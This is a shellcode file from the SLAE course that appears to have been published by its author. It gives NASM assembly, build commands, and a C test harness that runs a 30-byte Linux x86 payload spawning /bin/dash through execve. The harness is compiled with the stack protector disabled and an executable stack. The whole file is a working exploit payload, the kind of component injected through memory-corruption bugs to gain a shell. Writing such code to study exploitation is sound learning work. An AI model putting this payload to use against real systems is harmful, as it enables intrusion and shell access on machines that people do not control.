/*

################## Description ####################

; Title   : exec /bin/dash - Shellcode
; Author  : Hashim Jawad
; Website : ihack4falafel[.]com
; Twitter : @ihack4falafel
; SLAE ID : SLAE-1115
; Purpose : spawn /bin/dash shell
; OS      : Linux
; Arch    : x86
; Size    : 30 bytes

################### dash.nasm #####################

global _start

section .text

_start:

        ; push NULL into the stack
        xor eax, eax
        push eax

        ; push (////bin/dash) into the stack

        push 0x68736164
        push 0x2f6e6962
        push 0x2f2f2f2f

        ; push ESP pointer to EBX
        mov ebx, esp

        ; execute  __NR_execve syscall
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 0xb
        int 0x80

################### dash binary #####################

nasm -f elf32 -o dash.o dash.nasm

ld -z execstack -o dash dash.o

################### Shellcode ########################

objdump -d dash -M intel

##################  Compile  #########################

gcc -fno-stack-protector -z execstack dash.c -o dash

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}